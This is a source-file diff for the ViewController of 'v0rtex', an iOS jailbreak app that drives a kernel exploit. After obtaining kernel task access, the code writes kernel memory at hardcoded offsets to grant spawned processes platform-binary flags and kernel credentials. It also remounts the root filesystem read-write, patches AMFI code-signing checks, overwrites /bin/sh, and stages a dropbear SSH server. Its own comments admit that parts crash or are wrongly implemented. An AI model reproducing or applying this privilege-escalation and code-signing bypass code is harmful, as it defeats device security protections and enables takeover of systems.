@@ -1,0 +1,474 @@
+//
+//  ViewController.m
+//  v0rtex
+//
+//  Created by Sticktron on 2017-12-07.
+//  Copyright © 2017 Sticktron. All rights reserved.
+//
+
+#import "ViewController.h"
+
+#include "v0rtex.h"
+#include "kernel.h"
+#include "symbols.h"
+#include "root-rw.h"
+#include "the_super_fun_part/amfi.h"
+#include <sys/stat.h>
+#include <sys/spawn.h>
+#include <sys/stat.h>
+#include <CommonCrypto/CommonDigest.h>
+#include <mach-o/loader.h>
+#include <sys/dir.h>
+
+task_t tfp0;
+kptr_t kslide;
+kptr_t kern_ucred;
+kptr_t self_proc;
+
+//get executable path
+
+char* bundle_path() {
+    CFBundleRef mainBundle = CFBundleGetMainBundle();
+    CFURLRef resourcesURL = CFBundleCopyResourcesDirectoryURL(mainBundle);
+    int len = 4096;
+    char* path = malloc(len);
+    
+    CFURLGetFileSystemRepresentation(resourcesURL, TRUE, (UInt8*)path, len);
+    
+    return path;
+}
+
+//execute
+//thanks PsychoTea and whoever worked on his fork of v0rtex
+
+int execprog(task_t tfp0, uint64_t kslide, uint64_t kern_ucred, const char *prog, const char* args[]) {
+    if (args == NULL) {
+        args = (const char **)&(const char*[]){ prog, NULL };
+    }
+    
+    const char *logfile = [NSString stringWithFormat:@"/v0rtex/logs/%@-%lu",
+                           [[NSMutableString stringWithUTF8String:prog] stringByReplacingOccurrencesOfString:@"/" withString:@"_"],
+                           time(NULL)].UTF8String;
+    printf("Spawning [ ");
+    for (const char **arg = args; *arg != NULL; ++arg) {
+        printf("'%s' ", *arg);
+    }
+    printf("] to logfile [ %s ] \n", logfile);
+    
+    int rv;
+    posix_spawn_file_actions_t child_fd_actions;
+    if ((rv = posix_spawn_file_actions_init (&child_fd_actions))) {
+        perror ("posix_spawn_file_actions_init");
+        return rv;
+    }
+    if ((rv = posix_spawn_file_actions_addopen (&child_fd_actions, STDOUT_FILENO, logfile,
+                                                O_WRONLY | O_CREAT | O_TRUNC, 0666))) {
+        perror ("posix_spawn_file_actions_addopen");
+        return rv;
+    }
+    if ((rv = posix_spawn_file_actions_adddup2 (&child_fd_actions, STDOUT_FILENO, STDERR_FILENO))) {
+        perror ("posix_spawn_file_actions_adddup2");
+        return rv;
+    }
+    
+    pid_t pd;
+    if ((rv = posix_spawn(&pd, prog, &child_fd_actions, NULL, (char**)args, NULL))) {
+        printf("posix_spawn error: %d (%s)\n", rv, strerror(rv));
+        return rv;
+    }
+    
+    printf("process spawned with pid %d \n", pd);
+    
+#define CS_GET_TASK_ALLOW       0x0000004    /* has get-task-allow entitlement */
+#define CS_INSTALLER            0x0000008    /* has installer entitlement      */
+#define CS_HARD                 0x0000100    /* don't load invalid pages       */
+#define CS_RESTRICT             0x0000800    /* tell dyld to treat restricted  */
+#define CS_PLATFORM_BINARY      0x4000000    /* this is a platform binary      */
+    
+    /*
+     1. read 8 bytes from proc+0x100 into self_ucred
+     2. read 8 bytes from kern_ucred + 0x78 and write them to self_ucred + 0x78
+     3. write 12 zeros to self_ucred + 0x18
+     */
+    
+    // find_allproc will crash, currently
+    // please fix
+    if (kern_ucred != 0) {
+        int tries = 3;
+        while (tries-- > 0) {
+            sleep(1);
+            uint64_t proc = rk64(tfp0, kslide + 0xFFFFFFF0075E66F0);
+            while (proc) {
+                uint32_t pid = rk32_via_tfp0(tfp0, proc + 0x10);
+                if (pid == pd) {
+                    uint32_t csflags = rk32_via_tfp0(tfp0, proc + 0x2a8);
+                    csflags = (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT  | CS_HARD);
+                    wk32(tfp0, proc + 0x2a8, csflags);
+                    tries = 0;
+                    
+                    // i don't think this bit is implemented properly
+                    uint64_t self_ucred = rk64(tfp0, proc + 0x100);
+                    uint32_t selfcred_temp = rk32_via_tfp0(tfp0, kern_ucred + 0x78);
+                    wk32(tfp0, self_ucred + 0x78, selfcred_temp);
+                    
+                    for (int i = 0; i < 12; i++) {
+                        wk32(tfp0, self_ucred + 0x18 + (i * sizeof(uint32_t)), 0);
+                    }
+                    
+                    printf("gave elevated perms to pid %d \n", pid);
+                    
+                    // original stuff, rewritten above using v0rtex stuff
+                    // kcall(find_copyout(), 3, proc+0x100, &self_ucred, sizeof(self_ucred));
+                    // kcall(find_bcopy(), 3, kern_ucred + 0x78, self_ucred + 0x78, sizeof(uint64_t));
+                    // kcall(find_bzero(), 2, self_ucred + 0x18, 12);
+                    break;
+                }
+                proc = rk64(tfp0, proc);
+            }
+        }
+    }
+    
+    int status;
+    waitpid(pd, &status, 0);
+    printf("'%s' exited with %d (sig %d)\n", prog, WEXITSTATUS(status), WTERMSIG(status));
+    
+    char buf[65] = {0};
+    int fd = open(logfile, O_RDONLY);
+    if (fd == -1) {
+        perror("open logfile");
+        return 1;
+    }
+    
+    printf("contents of %s: \n ------------------------- \n", logfile);
+    while(read(fd, buf, sizeof(buf) - 1) == sizeof(buf) - 1) {
+        printf("%s", buf);
+    }
+    printf("%s", buf);
+    printf("\n-------------------------\n");
+    
+    close(fd);
+    remove(logfile);
+    
+    return 0;
+}
+
+int execprog_clean(task_t tfp0, uint64_t kslide, uint64_t kern_ucred, const char *prog, const char* args[]) {
+    if (args == NULL) {
+        args = (const char **)&(const char*[]){ prog, NULL };
+    }
+    
+    int rv;
+    pid_t pd;
+    if ((rv = posix_spawn(&pd, prog, NULL, NULL, (char**)args, NULL))) {
+        printf("posix_spawn error: %d (%s)\n", rv, strerror(rv));
+        return rv;
+    }
+    
+#define CS_GET_TASK_ALLOW       0x0000004    /* has get-task-allow entitlement */
+#define CS_INSTALLER            0x0000008    /* has installer entitlement      */
+#define CS_HARD                 0x0000100    /* don't load invalid pages       */
+#define CS_RESTRICT             0x0000800    /* tell dyld to treat restricted  */
+#define CS_PLATFORM_BINARY      0x4000000    /* this is a platform binary      */
+    
+    /*
+     1. read 8 bytes from proc+0x100 into self_ucred
+     2. read 8 bytes from kern_ucred + 0x78 and write them to self_ucred + 0x78
+     3. write 12 zeros to self_ucred + 0x18
+     */
+    
+    if (kern_ucred != 0) {
+        int tries = 3;
+        while (tries-- > 0) {
+            sleep(1);
+            // this needs to be moved to an offset VVVVVVVVVVVVV
+            uint64_t proc = rk64(tfp0, kslide + 0xFFFFFFF0075E66F0);
+            while (proc) {
+                uint32_t pid = rk32_via_tfp0(tfp0, proc + 0x10);
+                if (pid == pd) {
+                    uint32_t csflags = rk32_via_tfp0(tfp0, proc + 0x2a8);
+                    csflags = (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT  | CS_HARD);
+                    wk32(tfp0, proc + 0x2a8, csflags);
+                    tries = 0;
+                    
+                    // i don't think this bit is implemented properly
+                    uint64_t self_ucred = rk64(tfp0, proc + 0x100);
+                    uint32_t selfcred_temp = rk32_via_tfp0(tfp0, kern_ucred + 0x78);
+                    wk32(tfp0, self_ucred + 0x78, selfcred_temp);
+                    
+                    for (int i = 0; i < 12; i++) {
+                        wk32(tfp0, self_ucred + 0x18 + (i * sizeof(uint32_t)), 0);
+                    }
+                    
+                    // original stuff, rewritten above using v0rtex stuff
+                    // kcall(find_copyout(), 3, proc+0x100, &self_ucred, sizeof(self_ucred));
+                    // kcall(find_bcopy(), 3, kern_ucred + 0x78, self_ucred + 0x78, sizeof(uint64_t));
+                    // kcall(find_bzero(), 2, self_ucred + 0x18, 12);
+                    break;
+                }
+                proc = rk64(tfp0, proc);
+            }
+        }
+    }
+    
+    int status;
+    waitpid(pd, &status, 0);
+    return status;
+}
+@interface ViewController ()
+@property (weak, nonatomic) IBOutlet UITextView *outputView;
+@property (weak, nonatomic) IBOutlet UIButton *sploitButton;
+@end
+
+@implementation ViewController
+
+- (void)viewDidLoad {
+    [super viewDidLoad];
+    
+    self.sploitButton.layer.cornerRadius = 6;
+    self.outputView.layer.cornerRadius = 6;
+    
+    // Attempt to init our offsets
+    // Disable the run button if no offsets were found
+    if (!init_symbols()) {
+        [self writeText:@"Device not supported."];
+        [self.sploitButton setHidden:TRUE];
+        return;
+    }
+    
+    [self writeText:@"> ready."];
+}
+
+- (IBAction)runSploitButton:(UIButton *)sender {
+    if ([self.hastweaks isOn]) {
+    UIAlertController * alertController = [UIAlertController alertControllerWithTitle: @"Install deb"
+                                                                              message: @"Input link to deb to install"
+                                                                       preferredStyle:UIAlertControllerStyleAlert];
+    [alertController addTextFieldWithConfigurationHandler:^(UITextField *textField) {
+        textField.placeholder = @"deb link";
+        textField.keyboardType = UIKeyboardTypeDefault;
+    }];
+   
+    [alertController addAction:[UIAlertAction actionWithTitle:@"OK" style:UIAlertActionStyleDefault handler:^(UIAlertAction *action) {
+        NSArray * textfields = alertController.textFields;
+        UITextField * namefield = textfields[0];
+        NSLog(@"%@",namefield.text);
+        
+        NSURL  *url = [NSURL URLWithString:namefield.text];
+        NSData *urlData = [NSData dataWithContentsOfURL:url];//download deb
+        if (urlData)
+        {
+            NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
+            NSString *documentsDirectory = [paths objectAtIndex:0];
+            NSString *filePath = [NSString stringWithFormat:@"%@/%@", documentsDirectory,@"tweak.deb"];
+            [urlData writeToFile:filePath atomically:YES];//save it
+            sleep(2);
+            [self runsploit]; //run exploit
+        }
+        
+    }]];
+    [self presentViewController:alertController animated:YES completion:nil];
+    }
+    else {
+        [self runsploit];
+    }
+}
+- (void)runsploit{
+    
+    // Run v0rtex
+    [self writeText:@"> running exploit..."];
+
+    tfp0 = MACH_PORT_NULL;
+    kslide = 0;
+    kern_ucred = 0;
+    self_proc = 0;
+    
+    kern_return_t ret = v0rtex(&tfp0, &kslide, &kern_ucred, &self_proc);
+    
+    if (ret != KERN_SUCCESS) {
+        [self writeText:@"ERROR: exploit failed"];
+        return;
+    }
+    
+    [self writeText:@"exploit succeeded!"];
+    
+    
+    // Write a test file to var
+    
+    [self writeText:@"writing test file..."];
+    
+    extern kern_return_t mach_vm_read_overwrite(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, mach_vm_address_t data, mach_vm_size_t *outsize);
+    uint32_t magic = 0;
+    mach_vm_size_t sz = sizeof(magic);
+    ret = mach_vm_read_overwrite(tfp0, 0xfffffff007004000 + kslide, sizeof(magic), (mach_vm_address_t)&magic, &sz);
+    LOG("mach_vm_read_overwrite: %x, %s", magic, mach_error_string(ret));
+    
+    FILE *varF = fopen("/var/mobile/test.txt", "w");
+    LOG("var file: %p", varF);
+    if (varF == 0) {
+        [self writeText:@"ERROR: failed to write test var file"];
+        return;
+    }
+    
+    [self writeText:@"wrote test var file!"];
+    [self writeText:[NSString stringWithFormat:@"/var/mobile/test.txt (%p)", varF]];
+    
+    
+    // Remount '/' as r/w
+    
+    int remountOutput = mount_root(tfp0, kslide);
+    LOG("remount: %d", remountOutput);
+    if (remountOutput != 0) {
+        [self writeText:@"ERROR: failed to remount '/' as r/w"];
+      //  return;
+    }
+    
+    [self writeText:@"remounted '/' as r/w"];
+    
+    
+    // Write a test file to root
+    
+    [self writeText:@"writing test root file..."];
+    
+    FILE *rootF = fopen("/test.txt", "w");
+    LOG("root file: %p", rootF);
+    if (rootF == 0) {
+        [self writeText:@"ERROR: failed to write root test file"];
+       // return;
+    }
+    
+    [self writeText:@"wrote test root file!"];
+    [self writeText:[NSString stringWithFormat:@"/test.txt (%p)", rootF]];
+    
+    
+    
+    // init filemanager n bundlepath
+    NSFileManager *fileMgr = [NSFileManager defaultManager];
+    NSString *bundlePath = [NSString stringWithFormat:@"%s", bundle_path()];
+    
+    {
+        // remove old files
+        NSLog(@"removing old files...");
+        [fileMgr removeItemAtPath:@"/v0rtex/bins" error:nil];
+        [fileMgr removeItemAtPath:@"/v0rtex/bootstrap.tar" error:nil];
+        [fileMgr removeItemAtPath:@"/v0rtex/bootstrap2.tar" error:nil];
+        [fileMgr removeItemAtPath:@"/v0rtex/dropbear" error:nil];
+        [fileMgr removeItemAtPath:@"/v0rtex/start.sh" error:nil];
+        [fileMgr removeItemAtPath:@"/v0rtex/tar" error:nil];
+        [fileMgr removeItemAtPath:@"/bin/sh" error:nil];
+        //uncomment those lines if you want to re-etract the bootstrap
+        //chmod("/.installed_v0rtex", 0777);
+        //[fileMgr removeItemAtPath:@"/.installed_v0rtex" error:nil];
+        
+        // copy in all our bins
+        NSLog(@"copying bins...");
+        
+        // create v0rtex dirs
+        mkdir("/v0rtex", 0777);
+        //mkdir("/v0rtex/bins", 0777);
+        mkdir("/v0rtex/logs", 0777);
+        
+        NSError *error;
+        [fileMgr copyItemAtPath:[bundlePath stringByAppendingString:@"/bootstrap.tar"]
+                         toPath:@"/v0rtex/bootstrap.tar" error: &error];
+        if (error) NSLog(@"Error: %@", error);
+        
+        [fileMgr copyItemAtPath:[bundlePath stringByAppendingString:@"/dropbear"]
+                         toPath:@"/v0rtex/dropbear" error: &error];
+        if (error) NSLog(@"Error: %@", error);
+        
+        [fileMgr copyItemAtPath:[bundlePath stringByAppendingString:@"/tar"]
+                         toPath:@"/v0rtex/tar" error: &error];
+        if (error) NSLog(@"Error: %@", error);
+        
+        [fileMgr copyItemAtPath:[bundlePath stringByAppendingString:@"/bash"]
+                         toPath:@"/bin/sh" error: &error];
+        if (error) NSLog(@"Error: %@", error);
+        
+        // make sure all our bins have perms
+        chmod("/v0rtex/dropbear", 0777);
+        chmod("/v0rtex/tar", 0777);
+        chmod("/bin/sh", 0777);
+        
+        // create dir's and files for dropbear
+        mkdir("/etc", 0777);
+        mkdir("/etc/dropbear", 0777);
+        mkdir("/var", 0777);
+        mkdir("/var/log", 0777);
+        FILE *lastLog = fopen("/var/log/lastlog", "ab+");
+        fclose(lastLog);
+    }
+    
+    {
+        //first amfi patch: for v0rtex files
+        int amfi = patch_amfi(tfp0, kslide, YES, [self.hastweaks isOn]);
+        [self writeText:[NSString stringWithFormat:@"v0rtex amfi: %d", amfi]];
+    }
+    
+    {
+        //installed?
+        int f = open("/.installed_v0rtex", O_RDONLY);
+        
+        if (f == -1) {
+            // extract bootstrap.tar
+            execprog(tfp0, kslide, 0, "/v0rtex/tar", (const char **)&(const char*[]){ "/v0rtex/tar", "--preserve-permissions", "--no-overwrite-dir", "-xvf", "/v0rtex/bootstrap.tar", "-C", "/", NULL });
+        
+            //trust all the binaries
+            
+            open("/.installed_v0rtex", O_RDWR|O_CREAT);
+            open("/.cydia_no_stash",O_RDWR|O_CREAT);
+            
+            system("/usr/bin/uicache");
+            system("killall -SIGSTOP cfprefsd");
+            NSMutableDictionary* md = [[NSMutableDictionary alloc] initWithContentsOfFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist"];
+            [md setObject:[NSNumber numberWithBool:YES] forKey:@"SBShowNonDefaultSystemApps"];
+            [md writeToFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist" atomically:YES];
+            system("killall -9 cfprefsd");
+            }
+        }
+    
+    
+    {
+        //second amfi patch, binaries, tweaks & Cydia
+        int amfi2 = patch_amfi(tfp0, kslide, NO, [self.hastweaks isOn]);
+        [self writeText:[NSString stringWithFormat:@"cydia amfi: %d", amfi2]];
+        
+        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+            NSLog(@"cleaning up...");
+            [fileMgr removeItemAtPath:@"/v0rtex/bins" error:nil];
+            [fileMgr removeItemAtPath:@"/v0rtex/bootstrap.tar" error:nil];
+            [fileMgr removeItemAtPath:@"/v0rtex/bootstrap2.tar" error:nil];
+            [fileMgr removeItemAtPath:@"/v0rtex/dropbear" error:nil];
+            [fileMgr removeItemAtPath:@"/v0rtex/start.sh" error:nil];
+            [fileMgr removeItemAtPath:@"/v0rtex/tar" error:nil];
+            if ([self.hastweaks isOn]) {
+             system("killall SpringBoard"); //use modified killall to inject tweaks with cynject (cynject is the part of substrate that works without a KPP bypass)
+            }
+        });
+        
+       
+        
+        
+        NSLog(@"MAKE SURE TO FIRST RUN 'export PATH=$PATH:/v0rtex/bins' WHEN FIRST CONNECTING TO SSH");
+        /*ssh is disabled for these reasons:
+         - I can't run after killall SpringBoard as the app will also be quited
+         - If I run it before killall SpringBoard it seems to freeze the app and the device doesn't respring
+         will take a look later. Possibly will make a launchdaemon to properly start it
+         */
+        //execprog(tfp0, kslide, kern_ucred, "/v0rtex/dropbear", (const char**)&(const char*[]){
+           //"/v0rtex/dropbear", "-R", "-E", "-m", "-F", "-S", "/", NULL
+       //});
+     
+    }
+    
+    
+    // Done.
+    [self writeText:@""];
+    [self writeText:@"done."]; //logging does not work now for now
+    sleep(3);
+}
+
+- (void)writeText:(NSString *)text {
+    self.outputView.text = [self.outputView.text stringByAppendingString:[text stringByAppendingString:@"\n"]];
+}
+
+@end
